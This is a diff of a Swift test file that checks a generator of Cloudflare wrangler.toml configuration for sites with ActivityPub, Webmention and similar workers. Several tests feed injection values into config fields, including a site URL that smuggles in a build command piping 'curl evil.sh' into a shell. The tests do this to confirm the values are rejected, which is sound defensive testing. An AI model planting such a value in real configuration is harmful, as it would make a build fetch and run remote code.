@@ -45,7 +45,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site",
             workers: []
-        )
+        ).toml
         #expect(toml.contains("name = \"my-site\""))
         #expect(toml.contains("[assets]"))
         #expect(toml.contains("directory = \"dist\""))
@@ -58,7 +58,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [],
             mcpEnabled: true
-        )
+        ).toml
         #expect(toml.contains("main = \"worker/worker.ts\""))
         #expect(toml.contains("binding = \"ASSETS\""))
         #expect(toml.contains("run_worker_first = [\"/mcp\"]"))
@@ -66,7 +66,7 @@ struct WorkerCompositionTests {
 
     @Test("mcpEnabled false on an otherwise static-only site composes no Worker")
     func mcpDisabledStaysStatic() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: []).toml
         #expect(!toml.contains("main = \"worker/worker.ts\""))
         #expect(!toml.contains("run_worker_first"))
     }
@@ -76,7 +76,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site",
             workers: [genericD1KVWorker, indieauthWorker]
-        )
+        ).toml
         #expect(toml.contains("name = \"my-site\""))
         #expect(toml.contains("[assets]"))
         #expect(toml.contains("[[d1_databases]]"))
@@ -101,7 +101,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site",
             workers: v2Workers
-        )
+        ).toml
         #expect(toml.contains("[[d1_databases]]"))
         #expect(toml.contains("[[kv_namespaces]]"))
         #expect(!toml.contains("[[r2_buckets]]"))
@@ -112,7 +112,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site",
             workers: v3Workers
-        )
+        ).toml
         #expect(toml.contains("[[d1_databases]]"))
         #expect(toml.contains("[[kv_namespaces]]"))
         #expect(toml.contains("[[r2_buckets]]"))
@@ -125,7 +125,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: v3Workers,
             resources: .init(d1DatabaseID: "d1-id", kvNamespaceID: "kv-id", r2BucketName: "custom-media")
-        )
+        ).toml
 
         #expect(toml.contains("database_id = \"d1-id\""))
         #expect(toml.contains("id = \"kv-id\""))
@@ -195,7 +195,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: siteName,
             workers: v3Workers + [solidPodWorker, webdavWorker]
-        )
+        ).toml
         #expect(toml.contains("name = \"f0ef6a17-9948-4157-98ce-a6d8234ba0af\""))
         #expect(toml.contains("bucket_name = \"f0ef6a17-9948-4157-98ce-a6d8234ba0af-pod-blobs\""))
         #expect(toml.contains("bucket_name = \"f0ef6a17-9948-4157-98ce-a6d8234ba0af-media\""))
@@ -208,7 +208,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: siteName,
             workers: [micropubWorker, solidPodWorker]
-        )
+        ).toml
         #expect(wranglerNamingProblems(in: toml).isEmpty, "\(wranglerNamingProblems(in: toml))")
     }
 
@@ -233,7 +233,7 @@ struct WorkerCompositionTests {
     @Test("inboxCaptureEnabled adds an INBOX_KV binding and uncomments main even with no @dwk/* workers")
     func inboxCaptureAddsKVBinding() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true)
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true).toml
         #expect(toml.contains("main = \"worker/worker.ts\""))
         #expect(toml.contains("binding = \"INBOX_KV\""))
         #expect(toml.contains("id = \"\"  # filled by provisioning"))
@@ -242,13 +242,13 @@ struct WorkerCompositionTests {
     @Test("inboxCaptureEnabled fills the provisioned namespace id when given")
     func inboxCaptureFillsProvisionedID() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxKVNamespaceID: "abc123")
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxKVNamespaceID: "abc123").toml
         #expect(toml.contains("id = \"abc123\""))
     }
 
     @Test("inboxCaptureEnabled false omits the INBOX_KV binding")
     func inboxCaptureDisabledOmitsBinding() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: []).toml
         #expect(!toml.contains("INBOX_KV"))
         #expect(!toml.contains("main ="))
     }
@@ -258,7 +258,7 @@ struct WorkerCompositionTests {
     @Test("inboxCaptureEnabled + a plausible inboxForwardEmail emits a send_email binding and var")
     func inboxForwardingEmitsSendEmailBinding() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxForwardEmail: "owner@example.com")
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxForwardEmail: "owner@example.com").toml
         #expect(toml.contains("[[send_email]]"))
         #expect(toml.contains("name = \"SEND_EMAIL\""))
         #expect(toml.contains("destination_address = \"owner@example.com\""))
@@ -268,7 +268,7 @@ struct WorkerCompositionTests {
     @Test("inboxForwardEmail nil omits the send_email binding and var")
     func inboxForwardingOmittedWithoutEmail() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true)
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true).toml
         #expect(!toml.contains("send_email"))
         #expect(!toml.contains("INBOX_FORWARD_EMAIL"))
     }
@@ -276,7 +276,7 @@ struct WorkerCompositionTests {
     @Test("inboxForwardEmail is ignored when inboxCaptureEnabled is false")
     func inboxForwardingIgnoredWhenCaptureDisabled() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxForwardEmail: "owner@example.com")
+            siteName: "my-site", workers: [], inboxForwardEmail: "owner@example.com").toml
         #expect(!toml.contains("send_email"))
         #expect(!toml.contains("INBOX_FORWARD_EMAIL"))
     }
@@ -284,7 +284,7 @@ struct WorkerCompositionTests {
     @Test("an implausible inboxForwardEmail (no @) omits the send_email binding and var")
     func inboxForwardingOmittedForImplausibleEmail() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxForwardEmail: "not-an-email")
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true, inboxForwardEmail: "not-an-email").toml
         #expect(!toml.contains("send_email"))
         #expect(!toml.contains("INBOX_FORWARD_EMAIL"))
     }
@@ -293,7 +293,7 @@ struct WorkerCompositionTests {
     func inboxForwardingOmittedForUnsafeEmail() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [], inboxCaptureEnabled: true,
-            inboxForwardEmail: "owner\"@example.com")
+            inboxForwardEmail: "owner\"@example.com").toml
         #expect(!toml.contains("send_email"))
         #expect(!toml.contains("INBOX_FORWARD_EMAIL"))
     }
@@ -309,20 +309,20 @@ struct WorkerCompositionTests {
                 specificationURL: URL(string: "https://www.rfc-editor.org/rfc/rfc8555")),
         ]
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims)
+            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims).toml
         #expect(toml.contains(
             #"run_worker_first = ["/.well-known/acme-challenge", "/.well-known/acme-challenge/*", "/authorize", "/token"]"#
         ))
         // Regeneration is byte-stable regardless of claim order.
         let regenerated = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims.reversed())
+            siteName: "my-site", workers: [indieauthWorker], routeClaims: claims.reversed()).toml
         #expect(toml == regenerated)
     }
 
     @Test("run_worker_first is omitted entirely when there are no active dynamic routes")
     func omitsRunWorkerFirstWithoutClaims() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [genericD1KVWorker, indieauthWorker])
+            siteName: "my-site", workers: [genericD1KVWorker, indieauthWorker]).toml
         #expect(!toml.contains("run_worker_first"))
         #expect(toml.contains("binding = \"ASSETS\""))
     }
@@ -330,7 +330,7 @@ struct WorkerCompositionTests {
     @Test("inbox capture claims /inbox as a worker-first route")
     func inboxCaptureClaimsRoute() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [], inboxCaptureEnabled: true)
+            siteName: "my-site", workers: [], inboxCaptureEnabled: true).toml
         #expect(toml.contains(#"run_worker_first = ["/inbox"]"#))
     }
 
@@ -354,13 +354,13 @@ struct WorkerCompositionTests {
         let owned = WorkerRouteClaims.wellKnownClaims(
             WorkerComposition.withAPICatalogClaim([], workers: [indieauthWorker]))
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [indieauthWorker], routeClaims: owned.map(\.claim))
+            siteName: "my-site", workers: [indieauthWorker], routeClaims: owned.map(\.claim)).toml
         #expect(toml.contains(#""/.well-known/api-catalog""#))
     }
 
     @Test("static-only sites emit no run_worker_first")
     func staticOnlyOmitsRunWorkerFirst() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: []).toml
         #expect(!toml.contains("run_worker_first"))
     }
 
@@ -391,14 +391,14 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [webmentionWorker],
             resources: .init(d1DatabaseID: "d1-id")
-        )
+        ).toml
         #expect(toml.contains("binding = \"WEBMENTION_INBOX\""))
         #expect(toml.contains("database_id = \"d1-id\""))
     }
 
     @Test("no webmention worker means no WEBMENTION_INBOX binding")
     func noWebmentionOmitsInboxBinding() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker]).toml
         #expect(!toml.contains("WEBMENTION_INBOX"))
     }
 
@@ -408,7 +408,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [webmentionWorker],
             resources: .init(queueName: "my-site-webmention")
-        )
+        ).toml
         #expect(toml.contains("[[queues.producers]]"))
         #expect(toml.contains("[[queues.consumers]]"))
         #expect(toml.contains("queue = \"my-site-webmention\""))
@@ -417,7 +417,7 @@ struct WorkerCompositionTests {
 
     @Test("webmention queue name defaults to a deterministic placeholder before provisioning")
     func webmentionQueueDefaultsUnprovisioned() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker]).toml
         #expect(toml.contains("queue = \"my-site-webmention\""))
     }
 
@@ -427,14 +427,14 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [websubWorker],
             resources: .init(d1DatabaseID: "d1-id")
-        )
+        ).toml
         #expect(toml.contains("binding = \"WEBSUB_DB\""))
         #expect(toml.contains("database_id = \"d1-id\""))
     }
 
     @Test("no websub worker means no WEBSUB_DB binding or websub queue")
     func noWebsubOmitsHubBindings() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker]).toml
         #expect(!toml.contains("WEBSUB_DB"))
         #expect(!toml.contains("WEBSUB_QUEUE"))
         #expect(!toml.contains("my-site-websub"))
@@ -446,7 +446,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [webmentionWorker, websubWorker],
             resources: .init(queueName: "my-site-webmention", websubQueueName: "my-site-websub")
-        )
+        ).toml
         #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
         #expect(toml.contains("queue = \"my-site-webmention\""))
         #expect(toml.contains("binding = \"WEBSUB_QUEUE\""))
@@ -455,14 +455,14 @@ struct WorkerCompositionTests {
 
     @Test("websub queue name defaults to a deterministic placeholder before provisioning")
     func websubQueueDefaultsUnprovisioned() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [websubWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [websubWorker]).toml
         #expect(toml.contains("queue = \"my-site-websub\""))
     }
 
     @Test("websub alone (no webmention) with a known site URL emits a SITE_URL var")
     func websubEmitsSiteURL() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [websubWorker], siteURL: "https://my-site.example")
+            siteName: "my-site", workers: [websubWorker], siteURL: "https://my-site.example").toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
     }
@@ -470,14 +470,14 @@ struct WorkerCompositionTests {
     @Test("webmention receive with a known site URL emits a SITE_URL var")
     func webmentionEmitsSiteURL() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://my-site.example")
+            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://my-site.example").toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
     }
 
     @Test("webmention receive with no known site URL omits the vars block")
     func webmentionOmitsSiteURLWhenUnknown() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker]).toml
         #expect(!toml.contains("[vars]"))
         #expect(!toml.contains("SITE_URL"))
     }
@@ -490,14 +490,14 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [microsubWorker],
             resources: .init(d1DatabaseID: "d1-id")
-        )
+        ).toml
         #expect(toml.contains("binding = \"MICROSUB_DB\""))
         #expect(toml.contains("database_id = \"d1-id\""))
     }
 
     @Test("no microsub worker means no MICROSUB_DB binding or microsub queue")
     func noMicrosubOmitsReaderBindings() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker]).toml
         #expect(!toml.contains("MICROSUB_DB"))
         #expect(!toml.contains("MICROSUB_QUEUE"))
         #expect(!toml.contains("my-site-microsub"))
@@ -512,7 +512,7 @@ struct WorkerCompositionTests {
                 queueName: "my-site-webmention", websubQueueName: "my-site-websub",
                 microsubQueueName: "my-site-microsub"
             )
-        )
+        ).toml
         #expect(toml.contains("binding = \"WEBMENTION_QUEUE\""))
         #expect(toml.contains("binding = \"WEBSUB_QUEUE\""))
         #expect(toml.contains("binding = \"MICROSUB_QUEUE\""))
@@ -521,27 +521,27 @@ struct WorkerCompositionTests {
 
     @Test("microsub queue name defaults to a deterministic placeholder before provisioning")
     func microsubQueueDefaultsUnprovisioned() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker]).toml
         #expect(toml.contains("queue = \"my-site-microsub\""))
     }
 
     @Test("microsub adds a Cron Trigger for the feed poller")
     func microsubAddsCronTrigger() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [microsubWorker]).toml
         #expect(toml.contains("[triggers]"))
         #expect(toml.contains("crons = [\"*/15 * * * *\"]"))
     }
 
     @Test("no microsub worker means no Cron Trigger")
     func noMicrosubMeansNoCronTrigger() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [webmentionWorker]).toml
         #expect(!toml.contains("[triggers]"))
     }
 
     @Test("microsub alone (no webmention/websub) with a known site URL emits a SITE_URL var")
     func microsubEmitsSiteURL() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [microsubWorker], siteURL: "https://my-site.example")
+            siteName: "my-site", workers: [microsubWorker], siteURL: "https://my-site.example").toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("SITE_URL = \"https://my-site.example\""))
     }
@@ -550,14 +550,14 @@ struct WorkerCompositionTests {
     func micropubAddsDatabaseBinding() throws {
         let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [micropub])
+            siteName: "my-site", workers: [micropub]).toml
         #expect(toml.contains("binding = \"MICROPUB_DB\""))
         #expect(toml.contains("database_name = \"my-site-social\""))
     }
 
     @Test("no micropub worker means no MICROPUB_DB binding")
     func noMicropubMeansNoDatabaseBinding() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: []).toml
         #expect(!toml.contains("MICROPUB_DB"))
     }
 
@@ -566,7 +566,7 @@ struct WorkerCompositionTests {
         let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [micropub],
-            resources: .init(d1DatabaseID: "d1-existing"))
+            resources: .init(d1DatabaseID: "d1-existing")).toml
         // Find the MICROPUB_DB block specifically, not just any database_id in the file (the
         // generic DB block from needsD1 also emits one).
         let micropubBlock = try #require(toml.range(of: "binding = \"MICROPUB_DB\""))
@@ -577,7 +577,7 @@ struct WorkerCompositionTests {
     @Test("activitypub adds a durable_objects.bindings block and a migrations block")
     func activitypubAddsDurableObjectBinding() throws {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub]).toml
         #expect(toml.contains("[[durable_objects.bindings]]"))
         #expect(toml.contains("name = \"ACTOR\""))
         #expect(toml.contains("class_name = \"ActivityPubObject\""))
@@ -588,7 +588,7 @@ struct WorkerCompositionTests {
 
     @Test("no activitypub worker means no durable_objects or migrations block")
     func noActivitypubMeansNoDurableObjectBinding() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: []).toml
         #expect(!toml.contains("durable_objects"))
         #expect(!toml.contains("[[migrations]]"))
     }
@@ -598,7 +598,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], displayName: "Alice's Blog"
-        )
+        ).toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
     }
@@ -606,7 +606,7 @@ struct WorkerCompositionTests {
     @Test("activitypub with no known display name omits AP_DISPLAY_NAME but not other vars")
     func activitypubWithoutDisplayNameOmitsVar() throws {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub]).toml
         #expect(!toml.contains("AP_DISPLAY_NAME"))
     }
 
@@ -617,7 +617,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub, webmention],
             siteURL: "https://example.com", displayName: "Alice's Blog"
-        )
+        ).toml
         let varsRange = try #require(toml.range(of: "[vars]"))
         let afterVars = toml[varsRange.upperBound...]
         #expect(afterVars.contains("SITE_URL = \"https://example.com\""))
@@ -629,7 +629,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], displayName: "Alice\" INJECTED"
-        )
+        ).toml
         #expect(!toml.contains("AP_DISPLAY_NAME"))
     }
 
@@ -638,7 +638,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], apUsername: "alice"
-        )
+        ).toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("AP_USERNAME = \"alice\""))
     }
@@ -646,7 +646,7 @@ struct WorkerCompositionTests {
     @Test("activitypub with no handle override omits AP_USERNAME but not other vars")
     func activitypubWithoutUsernameOmitsVar() throws {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub]).toml
         #expect(!toml.contains("AP_USERNAME"))
     }
 
@@ -656,7 +656,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub],
             displayName: "Alice's Blog", apUsername: "alice"
-        )
+        ).toml
         let varsRange = try #require(toml.range(of: "[vars]"))
         let afterVars = toml[varsRange.upperBound...]
         #expect(afterVars.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
@@ -668,7 +668,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], apUsername: "alice\" INJECTED"
-        )
+        ).toml
         #expect(!toml.contains("AP_USERNAME"))
     }
 
@@ -679,7 +679,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], apIcon: "/apple-touch-icon.png"
-        )
+        ).toml
         #expect(toml.contains("[vars]"))
         #expect(toml.contains("AP_ICON = \"/apple-touch-icon.png\""))
     }
@@ -687,7 +687,7 @@ struct WorkerCompositionTests {
     @Test("activitypub with no known icon omits AP_ICON")
     func activitypubWithoutIconOmitsVar() throws {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub]).toml
         #expect(!toml.contains("AP_ICON"))
     }
 
@@ -696,7 +696,7 @@ struct WorkerCompositionTests {
         let webmention = worker(WorkerComposition.webmentionWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [webmention], apIcon: "/apple-touch-icon.png"
-        )
+        ).toml
         #expect(!toml.contains("AP_ICON"))
     }
 
@@ -706,7 +706,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub],
             displayName: "Alice's Blog", apUsername: "alice", apIcon: "https://example.com/me.png"
-        )
+        ).toml
         let varsRange = try #require(toml.range(of: "[vars]"))
         let afterVars = toml[varsRange.upperBound...]
         #expect(afterVars.contains("AP_DISPLAY_NAME = \"Alice's Blog\""))
@@ -719,14 +719,14 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], apIcon: "/me.png\" INJECTED"
-        )
+        ).toml
         #expect(!toml.contains("AP_ICON"))
     }
 
     @Test("siteURL is ignored when webmention receive isn't active")
     func siteURLIgnoredWithoutWebmention() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [indieauthWorker], siteURL: "https://my-site.example")
+            siteName: "my-site", workers: [indieauthWorker], siteURL: "https://my-site.example").toml
         #expect(!toml.contains("SITE_URL"))
     }
 
@@ -735,17 +735,17 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], activityPubActorType: "Group"
-        )
+        ).toml
         #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
     }
 
     @Test("activitypub with no actorType (or a non-Group value) omits AP_ACTOR_TYPE")
     func activitypubWithoutGroupOmitsActorTypeVar() throws {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [activitypub]).toml
         #expect(!toml.contains("AP_ACTOR_TYPE"))
         let tomlPerson = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [activitypub], activityPubActorType: "Person")
+            siteName: "my-site", workers: [activitypub], activityPubActorType: "Person").toml
         #expect(!tomlPerson.contains("AP_ACTOR_TYPE"))
     }
 
@@ -755,7 +755,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
             moderators: ["https://mod1.example/actor", "https://mod2.example/actor"]
-        )
+        ).toml
         #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor,https://mod2.example/actor\""))
     }
 
@@ -764,7 +764,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], moderators: ["https://mod1.example/actor"]
-        )
+        ).toml
         #expect(!toml.contains("AP_MODERATORS"))
         #expect(!toml.contains("AP_ACTOR_TYPE"))
     }
@@ -775,7 +775,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
             moderators: ["", "https://evil.example/\"injected"]
-        )
+        ).toml
         #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
         #expect(!toml.contains("AP_MODERATORS"))
     }
@@ -786,7 +786,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
             moderators: ["https://mod1.example/actor", "https://evil.example/actor?a=1,b=2"]
-        )
+        ).toml
         // The comma-bearing IRI is dropped entirely rather than corrupting the comma-joined list
         // — mod1 alone still emits a valid, unambiguous AP_MODERATORS value.
         #expect(toml.contains("AP_MODERATORS = \"https://mod1.example/actor\""))
@@ -799,7 +799,7 @@ struct WorkerCompositionTests {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub], activityPubActorType: "Group",
             moderators: ["https://evil.example/actor?a=1,b=2"]
-        )
+        ).toml
         #expect(toml.contains("AP_ACTOR_TYPE = \"Group\""))
         #expect(!toml.contains("AP_MODERATORS"))
     }
@@ -808,7 +808,7 @@ struct WorkerCompositionTests {
     func rejectsSiteURLWithEmbeddedQuote() throws {
         let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [webmentionWorker], siteURL: malicious)
+            siteName: "my-site", workers: [webmentionWorker], siteURL: malicious).toml
         #expect(!toml.contains("SITE_URL"))
         #expect(!toml.contains("[build]"))
         #expect(!toml.contains("curl evil.sh"))
@@ -817,14 +817,14 @@ struct WorkerCompositionTests {
     @Test("a siteURL containing a backslash is rejected")
     func rejectsSiteURLWithBackslash() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [webmentionWorker], siteURL: #"https://example.com\injected"#)
+            siteName: "my-site", workers: [webmentionWorker], siteURL: #"https://example.com\injected"#).toml
         #expect(!toml.contains("SITE_URL"))
     }
 
     @Test("a siteURL containing a control character (newline) is rejected")
     func rejectsSiteURLWithControlCharacter() throws {
         let toml = try WorkerComposition.generateWranglerToml(
-            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://example.com\nEVIL = true")
+            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://example.com\nEVIL = true").toml
         #expect(!toml.contains("SITE_URL"))
         #expect(!toml.contains("EVIL"))
     }
@@ -853,7 +853,7 @@ struct WorkerCompositionTests {
     func solidOidcBindings() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [indieauthWorker, solidOidcWorker]
-        )
+        ).toml
         #expect(toml.contains("binding = \"AUTH_DB\""))
         #expect(toml.contains("OIDC_SIGNING_KEY"))
         // Only one AUTH_DB block — solid-oidc must not emit a second, differently-keyed one.
@@ -864,7 +864,7 @@ struct WorkerCompositionTests {
     func solidPodBindings() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [solidPodWorker]
-        )
+        ).toml
         #expect(toml.contains("name = \"POD\""))
         #expect(toml.contains("class_name = \"SolidPodObject\""))
         #expect(toml.contains("new_sqlite_classes = [\"SolidPodObject\"]"))
@@ -880,7 +880,7 @@ struct WorkerCompositionTests {
         let micropub = worker(WorkerComposition.micropubWorkerID, d1: true, kv: false, r2: true)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [solidPodWorker, micropub]
-        )
+        ).toml
         #expect(toml.contains("binding = \"BLOBS\""))
         #expect(toml.contains("bucket_name = \"my-site-pod-blobs\""))
         #expect(toml.contains("binding = \"MEDIA\""))
@@ -891,7 +891,7 @@ struct WorkerCompositionTests {
     func webdavBindings() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [solidPodWorker, webdavWorker]
-        )
+        ).toml
         #expect(toml.contains("WEBDAV_PEPPER"))
